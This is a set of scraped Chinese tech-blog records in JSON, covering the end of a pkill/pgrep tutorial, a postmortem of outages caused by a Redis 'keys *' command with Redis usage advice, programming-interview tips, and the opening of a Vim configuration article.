class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6700d11c8110571735-4\"><span class=\"crayon-v\">alan</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">workstation</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pkill</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">f</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nginxsec</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0016 seconds] -->\r\n<p><code>pgrep</code>（尤其是 <code>pkill</code>）要记住的关键点是，您必须始终确保搜索结果准确性，这样您就不会无意中影响到错误的进程。</p>\n<p>大多数这些命令都有许多命令行选项，所以我总是建议阅读每一个命令的 <a href=\"https://www.kernel.org/doc/man-pages/\">man 手册页</a>。虽然大多数这些命令都存在于 Linux、Solaris 和 BSD 等平台上，但也有一些不同之处。在命令行工作或编写脚本时，始终测试并随时准备根据需要进行更正。</p>\n<p> </p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114393\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114393votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114393\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 2 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/a7d253575f9f762a527f2b1b405c8e65cae34fe9.jpg"}
{"title": "Redis 的 KEYS 命令引起 RDS 数据库雪崩，宕机 2 次，造成几百万损失", "url": "http://blog.jobbole.com/114397/", "create_date": "2018/09/22", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2016/04/49961db8952e63d98b519b76a2daa5e2.png"], "url_object_id": "7dac2cf4ba2ba6db98a928d39b6db6b4", "praise_nums": 1, "fav_nums": 2, "comment_nums": 0, "tags": "IT技术,Redis", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"http://chenhaoxiang.cn/2018/09/20/1744/\">陈浩翔</a>   </div><p>最近的互联网线上事故发生比较频繁，<a href=\"https://mp.weixin.qq.com/s/pq_HI2VwZy81GTdQl9frvw\" target=\"_blank\">9月19日网上爆料出顺丰近期发生了一起线上删库事件</a>，在这里就不介绍了。</p>\n<p>在这里讲述一下最近发生在我公司的事故，以及如何避免，并且如何处理优化。 该宕机的直接原因是使用 Redis 的 <code><strong><span style=\"color: #ff0000;\">keys *</span></strong> </code>命令引起的，一共造成了某个服务化项目的两次宕机。</p>\n<p>间接原因还有很多，技术跟不上业务的发展，由每日百万量到千万级是一个大的跨进，公司对于系统优化的处理优先级不高，技术开发人手的短缺。</p>\n<h2>第一次宕机</h2>\n<p>2018年9月13日的某个点，公司某服务化项目的 RDS 实例连接飙升，CPU 升到 100%，拒绝了其他应用的所有请求服务。</p>\n<p>整个过程如下：</p>\n<ul>\n<li>监控报警，显示RDS的CPU使用率达到80%以上，DBA介入，准备KILL慢SQL</li>\n<li>1分钟内，没有发现明显阻塞的SQL，CPU持续上升到99%</li>\n<li>5分钟内，大量应用报警，并且拒绝服务，RDS的监控显示出现大量慢SQL，联系服务器数据库提供商进行协助</li>\n<li>8分钟内，进行数据库主备切换（业务会受损，但是也没办法，没有定位到问题）</li>\n<li>9分钟内，部分业务恢复，但是一些业务订单的回调消息堆积超过20w，备库的CPU使用率也持续上升</li>\n<li>15分钟内，备库CPU使用率超过97%，业务再次中断，进行切回主库，并进行限流</li>\n<li>20分钟内，关闭一些次要应用的流量入口</li>\n<li>25分钟内，主库CPU使用率恢复正常</li>\n<li>30分钟内，逐步开启关闭的限流应用</li>\n<li>35分钟内，所有应用恢复正常</li>\n<li>接下来就是与服务器数据库提供商成立应急小组紧急优化可能出现的慢SQL，虽然说可能解决了一些慢SQL，但此次并没有定位到具体的问题，也就为几天后再次发生宕机事件埋下了伏笔</li>\n</ul>\n<h3>事故影响</h3>\n<p>某服务化项目服务不可用几十分钟，造成订单数减少几十万笔，损失百万资金。</p>\n<h3>原因分析</h3>\n<p>当时是没有定位到具体的原因的，但是下面的原因也是一部分可能引起宕机的情况。</p>\n<p>某服务化项目的业务增速非常快，在高峰期，数据库QPS突破35000，系统处于高负荷状态。</p>\n<p>在高峰期如果同时执行几个全表扫描的SQL，会造成数据库压力急剧上升，应用超时增多，前端应用超时，用户重试，流量飙升，形成了雪崩效应。</p>\n<p>主要原因在与一些老项目的SQL查询性能较差，并且使用的主库，对数据库影响较大。数据库QPS太高，但是缓存方案因为人手原因一直没有落地，慢SQL的问题处理优先级应该提升。</p>\n<h3>改进方案</h3>\n<ol>\n<li>针对每个应用建一个数据库账号，严格按照规范使用</li>\n<li>缓存优化方案即时落地，慢SQL问题优先处理，集中处理目前已经发现的慢SQL（查询时间超过1S）</li>\n<li>升级数据库配置</li>\n<li>迁移非核心业务到新的RDS实例中去</li>\n</ol>\n<h2>第二次宕机</h2>\n<p>由于上一次的宕机原因未找到，所以此次的宕机是可以预见的。</p>\n<p>20180919，还是一样的”配方”，还是原来的”味道”。同一个RDS，CPU飙升至100%，接下来就是拒绝服务，宕机。当然，有了第一次的经验，直接主从切换，在几十秒左右就恢复了所有业务，但还是严重影响了公司的业务和形象</p>\n<h3>原因分析</h3>\n<p>恢复业务后，公司紧急召开了紧急事故研究会议，当然，我的级别是参与不了的。公司的高管，高层技术架构、DBA、各个项目的主负责人一起进行了会议。</p>\n<p>在此次会议中，经过查看各个项目的日志，后台的监控数据，发现在那台RDS数据库CPU飙升时，有一台Redis数据库内存将近100%，然后急剧下降。联系第一次的宕机情况，也是类似的。</p>\n<p>接下来就是联系服务器数据库提供商，将那台Redis最近一周的命令全部调用出来，最后发现，在那个时间点运行了一条<code>keys *...*</code>命令。公司的一个工程师执行keys模糊的匹配命令是为了清理没用的键，但是没有考虑到<code>keys *</code>进行模糊匹配引发Redis锁，造成Redis锁住，CPU飙升，引起了所有调用链路的超时并且卡住，等Redis锁的那几秒结束，所有的请求流量全部请求到RDS数据库中，使数据库产生了雪崩，使数据库宕机。</p>\n<h3>改进方案</h3>\n<ol>\n<li>所有线上操作，全部要经过运维通过后方可执行，运维部门逐步快速收回各项权限</li>\n<li>新增Redis实例，进行分离</li>\n<li>如果有使用类似keys正则命令需求，使用scan命令代替</li>\n</ol>\n<h2>总结</h2>\n<p>该事件中出现的两次事故，完全是由于人为操作引起的，如果那位工程师，看过Redis的开发规范，会发现是建议禁用keys命令的。另外，有线上的命令操作，一定要经过运维评估后方可进行操作，估计那个工程师是老员工吧，有权限，然后直接就进行操作了。</p>\n<p>另外，公司的业务发展确实很快，技术跟不上，这是非常非常危险的，极大的增加了宕机的概率。</p>\n<p>在业务量不大的情况下，那位工程师的操作是完全没什么问题的，毕竟并发也不大，但是现在，随着公司的发展，业务量的成倍成倍增加，技术的扩展却没有随着增长那么快。</p>\n<p>公司的技术人手不足也是一方面，绝大多数人都是边维护老项目边做新功能，但是对于项目的重构优化，人手却少了很多，项目优化的优先级不高，这也是很大的一个原因，极有可能出现类似的情况，新服务化构建迫在眉睫。</p>\n<p>最后的最后，线上操作的任何一条命令，再小心也不为过。</p>\n<p>因为由于你的一个符号而引起的事故可能是你所承担不起的</p>\n<h2>Redis开发建议</h2>\n<p>最后附上Redis的一些开发规范和建议：</p>\n<h3>1.冷热数据分离，不要将所有数据全部都放到Redis中</h3>\n<p>虽然Redis支持持久化，但是Redis的数据存储全部都是在内存中的，成本昂贵。建议根据业务只将高频热数据存储到Redis中【QPS大于5000】，对于低频冷数据可以使用MySQL/ElasticSearch/MongoDB等基于磁盘的存储方式，不仅节省内存成本，而且数据量小在操作时速度更快、效率更高！</p>\n<h3>2.不同的业务数据要分开存储</h3>\n<p>不要将不相关的业务数据都放到一个Redis实例中，建议新业务申请新的单独实例。因为Redis为单线程处理，独立存储会减少不同业务相互操作的影响，提高请求响应速度；同时也避免单个实例内存数据量膨胀过大，在出现异常情况时可以更快恢复服务！ 在实际的使用过程中，redis最大的瓶颈一般是CPU，由于它是单线程作业所以很容易跑满一个逻辑CPU，可以使用redis代理或者是分布式方案来提升redis的CPU使用率。</p>\n<h3>3.存储的Key一定要设置超时时间</h3>\n<p>如果应用将Redis定位为缓存Cache使用，对于存放的Key一定要设置超时时间！因为若不设置，这些Key会一直占用内存不释放，造成极大的浪费，而且随着时间的推移会导致内存占用越来越大，直到达到服务器内存上限！另外Key的超时长短要根据业务综合评估，而不是越长越好！</p>\n<h3>4.对于必须要存储的大文本数据一定要压缩后存储</h3>\n<p>对于大文本【+超过500字节】写入到Redis时，一定要压缩后存储！大文本数据存入Redis，除了带来极大的内存占用外，在访问量高时，很容易就会将网卡流量占满，进而造成整个服务器上的所有服务不可用，并引发雪崩效应，造成各个系统瘫痪！</p>\n<h3>5.线上Redis禁止使用Keys正则匹配操作</h3>\n<p>Redis是单线程处理，在线上KEY数量较多时，操作效率极低【时间复杂度为O(N)】，该命令一旦执行会严重阻塞线上其它命令的正常请求，而且在高QPS情况下会直接造成Redis服务崩溃！如果有类似需求，请使用scan命令代替！</p>\n<h3>6.可靠的消息队列服务</h3>\n<p>Redis List经常被用于消息队列服务。假设消费者程序在从队列中取出消息后立刻崩溃，但由于该消息已经被取出且没有被正常处理，那么可以认为该消息已经丢失，由此可能会导致业务数据丢失，或业务状态不一致等现象发生。</p>\n<p>为了避免这种情况，Redis提供了RPOPLPUSH命令，消费者程序会原子性的从主消息队列中取出消息并将其插入到备份队列中，直到消费者程序完成正常的处理逻辑后再将该消息从备份队列中删除。同时还可以提供一个守护进程，当发现备份队列中的消息过期时，可以重新将其再放回到主消息队列中，以便其它的消费者程序继续处理。</p>\n<h3>7.谨慎全量操作Hash、Set等集合结构</h3>\n<p>在使用HASH结构存储对象属性时，开始只有有限的十几个field，往往使用HGETALL获取所有成员，效率也很高，但是随着业务发展，会将field扩张到上百个甚至几百个，此时还使用HGETALL会出现效率急剧下降、网卡频繁打满等问题【时间复杂度O(N)】,此时建议根据业务拆分为多个Hash结构；或者如果大部分都是获取所有属性的操作,可以将所有属性序列化为一个STRING类型存储！同样在使用SMEMBERS操作SET结构类型时也是相同的情况！</p>\n<h3>8.根据业务场景合理使用不同的数据结构类型</h3>\n<p>目前Redis支持的数据库结构类型较多：字符串（String），哈希（Hash），列表（List），集合（Set），有序集合（Sorted Set）, Bitmap, HyperLogLog和地理空间索引（geospatial）等,需要根据业务场景选择合适的类型。</p>\n<p>常见的如：String可以用作普通的K-V、计数类；Hash可以用作对象如商品、经纪人等，包含较多属性的信息；List可以用作消息队列、粉丝/关注列表等；Set可以用于推荐；Sorted Set可以用于排行榜等！</p>\n<h3>9.命名规范</h3>\n<p>虽然说Redis支持多个数据库（默认32个，可以配置更多），但是除了默认的0号库以外，其它的都需要通过一个额外请求才能使用。所以用前缀作为命名空间可能会更明智一点。</p>\n<p>另外，在使用前缀作为命名空间区隔不同key的时候，最好在程序中使用全局配置来实现，直接在代码里写前缀的做法要严格避免，这样可维护性实在太差了。</p>\n<p>如：系统名:业务名:业务数据:其他</p>\n<p>但是注意，key的名称不要过长，尽量清晰明了，容易理解，需要自己衡量</p>\n<h3>10.线上禁止使用monitor命令</h3>\n<p>禁止生产环境使用monitor命令，monitor命令在高并发条件下，会存在内存暴增和影响Redis性能的隐患</p>\n<h3>11.禁止大string</h3>\n<p>核心集群禁用1mb的string大key(虽然redis支持512MB大小的string)，如果1mb的key每秒重复写入10次，就会导致写入网络IO达10MB;</p>\n<h3>12.redis容量</h3>\n<p>单实例的内存大小不建议过大，建议在10~20GB以内。</p>\n<p>redis实例包含的键个数建议控制在1kw内，单实例键个数过大，可能导致过期键的回收不及时。</p>\n<h3>13 可靠性</h3>\n<p>需要定时监控redis的健康情况：使用各种redis健康监控工具，实在不行可以定时返回redis 的 info信息。</p>\n<p>客户端连接尽量使用连接池（长链接和自动重连）</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114397\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114397votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114397\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 2 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/c766feed221138f7946130756cddfc7e86e388b4.jpg"}
{"title": "我从编程面试中学到的", "url": "http://blog.jobbole.com/114405/", "create_date": "2018/09/24", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/09/d57430ad6bf561a6afe8ea714aedd953.jpeg"], "url_object_id": "7b2c6de259a54e3668cc98daa9978cb3", "praise_nums": 1, "fav_nums": 0, "comment_nums": 0, "tags": "IT技术,业界", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://medium.freecodecamp.org/what-i-learned-from-programming-interviews-29ba49c9b851\">Edaena Salinas</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-10032-1.html\">Linux中国/DavidChenLiang</a>   </div><p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/09/d57430ad6bf561a6afe8ea714aedd953.jpeg\"></p>\n<p>在 2017 年，我参加了 ‘计算机行业中的女性’ 的<a href=\"https://anitab.org/event/2017-grace-hopper-celebration-women-computing/\">Grace Hopper 庆祝活动</a>。这个活动是这类科技活动中最大的一个。共有 17,000 名女性IT工作者参加。</p>\n<p>这个会议有个大型的配套招聘会，会上有招聘公司来面试会议参加者。有些人甚至现场拿到 offer。我在现场晃荡了一下，注意到一些应聘者看上去非常紧张忧虑。我还隐隐听到应聘者之间的谈话，其中一些人谈到在面试中做的并不好。</p>\n<p>我走近我听到谈话的那群人并和她们聊了起来并给了一些面试上的小建议。我想我的建议还是比较偏基本的，如“（在面试时）一开始给出个能工作的解决方案也还说的过去”之类的，但是当她们听到我的一些其他的建议时还是颇为吃惊。</p>\n<p>为了能更多的帮到像她们一样的小白面试者，我收集了一些过去对我有用的小点子，这些小点子我已经发表在了 <a href=\"https://thewomenintechshow.com/2017/12/18/programming-interviews/\">prodcast episode</a> 上。它们也是这篇文章的主题。</p>\n<p>为了实习生职位和全职工作，我做过很多次的面试。当我还在大学主修计算机科学时，学校每个秋季学期都有招聘会，第一轮招聘会在校园里举行。(我在第一和最后一轮都搞砸过。)不过，每次面试后，我都会反思哪些方面我能做的更好，我还会和朋友们做模拟面试，这样我就能从他们那儿得到更多的面试反馈。</p>\n<p>不管我们怎么样找工作: 工作中介、网络，或者学校招聘，他们的招聘流程中都会涉及到技术面试：</p>\n<p>近年来，我注意到了一些新的不同的面试形式出现了：</p>\n<ul>\n<li>与招聘方的一位工程师结对编程</li>\n<li>网络在线测试及在线编码</li>\n<li>白板编程（LCTT 译注： 这种形式应该不新了）</li>\n</ul>\n<p>我将重点谈谈白板面试，这种形式我经历的最多。我有过很多次面试，有些挺不错的，有些被我搞砸了。</p>\n<h4 id=\"toc_1\">我做错的地方</h4>\n<p>首先，我想回顾一下我做的不好的地方。知错能改，善莫大焉。</p>\n<p>当面试者提出一个要我解决的问题时， 我立即马上立刻开始在白板上写代码，<u>什么都不问。</u></p>\n<p>这里我犯了两个错误：</p>\n<h4 id=\"toc_2\">没有澄清对解决问题有关键作用的信息</h4>\n<p>比如，我们是否只用处理数字或者字符串？我们要支持多种数据类型吗？如果你在开始解题前不去问这些问题的话，你的面试官会有一种不好的印象：这个人在我们公司的话，他不会在开始项目工作之前不问清楚到底要做什么。而这恰恰是在工作场合很重要的一个工作习惯。公司可不像学校，你在开始工作前可不会得到写有所有详细步骤的作业说明。你得靠自己找到这些步骤并自己定义他们。</p>\n<h4 id=\"toc_3\">只会默默思考，不去记录想法或和面试官沟通</h4>\n<p>在面试中，很多时候我也会傻傻站在那思考，什么都不写。我和一个朋友模拟面试的时候，他告诉我因为他曾经和我一起工作过所以他知道我在思考，但是如果他是个陌生的面试官的话，他会觉得我正站在那冥思苦想，毫无头绪。不要急匆匆的直奔解题而去是很重要的。花点时间多想想各种解题的可能性。有时候面试官会乐意和你一起探索解题的步骤。不管怎样，这就是在一家公司开工作会议的的普遍方式，大家各抒己见，一起讨论如何解决问题。</p>\n<h3 id=\"toc_4\">想到一个解题方法</h3>\n<p>在你开始写代码之前，如果你能总结一下要使用到的算法就太棒了。不要上来就写代码并认为你的代码肯定能解决问题。</p>\n<p>这是对我管用的步骤：</p>\n<ol>\n<li>头脑风暴</li>\n<li>写代码</li>\n<li>处理错误路径</li>\n<li>测试</li>\n</ol>\n<h4 id=\"toc_5\">1、 头脑风暴</h4>\n<p>对我来说，我会首先通过一些例子来视觉化我要解决的问题。比如说如果这个问题和数据结构中的树有关，我就会从树底层的空节点开始思考，如何处理一个节点的情况呢？两个节点呢？三个节点呢？这能帮助你从具体例子里抽象出你的解决方案。</p>\n<p>在白板上先写下你的算法要做的事情列表。这样做，你往往能在开始写代码前就发现 bug 和缺陷（不过你可得掌握好时间）。我犯过的一个错误是我花了过多的时间在澄清问题和头脑风暴上，最后几乎没有留下时间给我写代码。你的面试官可能没有机会看你在白板上写下代码，这可太糟了。你可以带块手表，或者房间有钟的话，你也可以抬头看看时间。有些时候面试者会提醒你你已经得到了所有的信息（这时你就不要再问别的了），“我想我们已经把所有需要的信息都澄清了，让我们写代码实现吧”。</p>\n<h4 id=\"toc_6\">2、 开始写代码，一气呵成</h4>\n<p>如果你还没有得到问题的完美解决方法，从最原始的解法开始总是可以的。当你在向面试官解释最显而易见的解法时，你要想想怎么去完善它，并指明这种做法是最原始的，未加优化的。（请熟悉算法中的 <code>O()</code> 的概念，这对面试非常有用。）在向面试者提交前请仔细检查你的解决方案两三遍。面试者有时会给你些提示， “还有更好的方法吗？”，这句话的意思是面试官提示你有更优化的解决方案。</p>\n<h4 id=\"toc_7\">3、 错误处理</h4>\n<p>当你在编码时，对你想做错误处理的代码行做个注释。当面试者说，“很好，这里你想到了错误处理。你想怎么处理呢？抛出异常还是返回错误码？”，这将给你个机会去引出关于代码质量的一番讨论。当然，这种地方提出几个就够了。有时，面试者为了节省编码的时间，会告诉你可以假设外界输入的参数都已经通过了校验。不管怎样，你都要展现你对错误处理和编码质量的重要性的认识。</p>\n<h4 id=\"toc_8\">4、 测试</h4>\n<p>在编码完成后，用你在前面头脑风暴中写的用例来在你脑子里“跑”一下你的代码，确定万无一失。例如你可以说，“让我用前面写下的树的例子来跑一下我的代码，如果是一个节点是什么结果，如果是两个节点是什么结果……”</p>\n<p>在你结束之后，面试者有时会问你你将会怎么测试你的代码，你会涉及什么样的测试用例。我建议你用下面不同的分类来组织你的错误用例：</p>\n<p>一些分类可以为：</p>\n<ol>\n<li>性能</li>\n<li>错误用例</li>\n<li>期望的正常用例</li>\n</ol>\n<p>对于性能测试，要考虑极端数量下的情况。例如，如果问题是关于列表的，你可以说你将会使用一个非常大的列表以及的非常小的列表来测试。如果和数字有关，你将会测试系统中的最大整数和最小整数。我建议读一些有关软件测试的书来得到更多的知识。在这个领域我最喜欢的书是 《<a href=\"https://www.amazon.com/How-We-Test-Software-Microsoft/dp/0735624259\">我们在微软如何测试软件</a>》。</p>\n<p>对于错误用例，想一下什么是期望的错误情况并一一写下。</p>\n<p>对于正向期望用例，想想用户需求是什么？你的解决方案要解决什么问题？这些都可以成为正向期望用例。</p>\n<h3 id=\"toc_9\">“你还有什么要问我的吗？”</h3>\n<p>面试最后总是会留几分钟给你问问题。我建议你在面试前写下你想问的问题。千万别说，“我没什么问题了”，就算你觉得面试砸了或者你对这间公司不怎么感兴趣，你总有些东西可以问问。你甚至可以问面试者他最喜欢自己的工作什么，最讨厌自己的工作什么。或者你可以问问面试官的工作具体是什么，在用什么技术和实践。不要因为觉得自己在面试中做的不好而心灰意冷，不想问什么问题。</p>\n<h3 id=\"toc_10\">申请一份工作</h3>\n<p>关于找工作和申请工作，有人曾经告诉我，你应该去找你真正有激情工作的地方。去找一家你喜欢的公司，或者你喜欢使用的产品，看看你能不能去那儿工作。</p>\n<p>我个人并不推荐你用上述的方法去找工作。你会排除很多很好的公司，特别是你是在找实习工作或者入门级的职位时。</p>\n<p>你也可以集中在其他的一些目标上。如：我想从这个工作里得到哪方面的更多经验？这个工作是关于云计算？Web 开发？或是人工智能？当在招聘会上与招聘公司沟通时，看看他们的工作单位有没有在这些领域的。你可能会在一家并非在你的想去公司列表上的公司（或非盈利机构）里找到你想找的职位。</p>\n<h4 id=\"toc_11\">换组</h4>\n<p>在这家公司里的第一个组里呆了一年半以后，我觉得是时候去探索一下不同的东西了。我找到了一个我喜欢的组并进行了 4 轮面试。结果我搞砸了。</p>\n<p>我什么都没有准备，甚至都没在白板上练练手。我当时的逻辑是，如果我都已经在一家公司干了快 2 年了，我还需要练什么？我完全错了，我在接下去的白板面试中跌跌撞撞。我的板书写得太小，而且因为没有从最左上角开始写代码，我的代码大大超出了一个白板的空间，这些都导致了白板面试失败。</p>\n<p>我在面试前也没有刷过数据结构和算法题。如果我做了的话，我将会在面试中更有信心。就算你已经在一家公司担任了软件工程师，在你去另外一个组面试前，我强烈建议你在一块白板上演练一下如何写代码。</p>\n<p>对于换项目组这件事，如果你是在公司内部换组的话，事先能同那个组的人非正式聊聊会很有帮助。对于这一点，我发现几乎每个人都很乐于和你一起吃个午饭。人一般都会在中午有空，约不到人或者别人正好有会议冲突的风险会很低。这是一种非正式的途径来了解你想去的组正在干什么，以及这个组成员个性是怎么样的。相信我，你能从一次午餐中得到很多信息，这可会对你的正式面试帮助不小。</p>\n<p>非常重要的一点是，你在面试一个特定的组时，就算你在面试中做的很好，因为文化不契合的原因，你也很可能拿不到 offer。这也是为什么我一开始就想去见见组里不同的人的原因（有时这也不太可能），我希望你不要被一次拒绝所击倒，请保持开放的心态，选择新的机会，并多多练习。</p>\n<p>以上内容选自 《<a href=\"https://thewomenintechshow.com/\">The Women in Tech Show: Technical Interviews with Prominent Women in Tech</a>》的 “<a href=\"https://thewomenintechshow.com/2017/12/18/programming-interviews/\">编程面试</a>”章节，</p>\n<hr>\n<p>作者简介：</p>\n<p>微软研究院 Software Engineer II， <a href=\"http://www.thewomenintechshow.com\">www.thewomenintechshow.com</a> 站长，所有观点都只代表本人意见。</p>\n<p> </p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114405\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114405votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114405\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/246f060b1f9253c08c8ea8bf439891892b8005d5.jpg"}
{"title": "增强 Vim 编辑器，提高编辑效率", "url": "http://blog.jobbole.com/114402/", "create_date": "2018/09/24", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/09/79b16e91c471e8bea71d95f93e72fb22.png"], "url_object_id": "0956ebd570565529f8590f4ef722700f", "praise_nums": 1, "fav_nums": 1, "comment_nums": 0, "tags": "IT技术,Linux,Vim", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://opensource.com/article/18/9/vi-editor-productivity-powerhouse\">Girish Managoli</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-10039-1.html\">Linux中国/idea2act</a>   </div><p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/09/79b16e91c471e8bea71d95f93e72fb22.png\"></p>\n<p><code>Vim</code> 作为一款功能强大、选项丰富的编辑器，为许多用户所热爱。本文介绍了一些在 <code>Vim</code> 中默认未启用但实际非常有用的选项。虽然可以在每个 <code>Vim</code> 会话中单独启用，但为了创建一个开箱即用的高效编辑环境，还是建议在 <code>Vim</code> 的配置文件中配置这些命令。</p>\n<h3>开始前的准备</h3>\n<p>这里所说的选项或配置均位于用户主目录中的 <code>Vim</code> 启动配置文件 <code>.vimrc</code>。 按照下面的说明在 <code>.vimrc</code> 中设置选项：</p>\n<p>（注意：<code>vimrc</code> 文件也用于 <code>Linux</code> 中的全局配置，如 <code>/etc/vimrc</code> 或 <code>/etc/vim/vimrc</code>。本文所说的 <code>.vimrc</code> 均是指位于用户主目录中的 <code>.vimrc</code> 文件。）</p>\n<p>Linux 系统中：</p>\n<ul>\n<li>用 <code>Vim</code> 打开 <code>.vimrc</code> 文件： <code>vim ~/.vimrc</code></li>\n<li>复制本文最后的 <code>选项列表</code> 粘贴到 <code>.vimrc</code> 文件</li>\n<li>保存并关闭 (<code>:wq</code>)</li>\n</ul>\n<p>（LCTT 译注：此处不建议使用 <code>Vim</code> 编辑 <code>.vimrc</code> 文件，因为很可能无法粘贴成功，可以选择 <code>gedit</code> 编辑器编辑 <code>.vimrc</code> 文件。）</p>\n<p>Windows 系统中：</p>\n<ul>\n<li>首先，<a href=\"https://www.vim.org/download.php#pc\">安装 gvim</a></li>\n<li>打开 <code>gvim</code></li>\n<li>单击 “编辑” -&gt; “启动设置”，打开 <code>_vimrc</code> 文件</li>\n<li>复制本文最后的 “选项列表” 粘贴到 <code>_vimrc</code> 文件</li>\n<li>单击 “文件” -&gt; “保存”</li>\n</ul>\n<p>（LCTT 译注：此处应注意不要使用 <code>Windows</code> 自带的记事本编辑该 <code>_vimrc</code> 文件，否则可能会因为行结束符不同而导致问题。）</p>\n<p>下面，我们将深入研究提高 <code>Vim</code> 编辑效率的选项。主要分为以下几类：</p>\n<ol>\n<li>缩进 &amp; 制表符</li>\n<li>显示 &amp; 格式化</li>\n<li>搜索</li>\n<li>浏览 &amp; 滚动</li>\n<li>拼写</li>\n<li>其他选项</li>\n</ol>\n<h3 id=\"toc_2\">1. 缩进 &amp; 制表符</h3>\n<p>使 <code>Vim</code> 在创建新行的时候使用与上一行同样的缩进：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab66fbd21aa612357332\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px 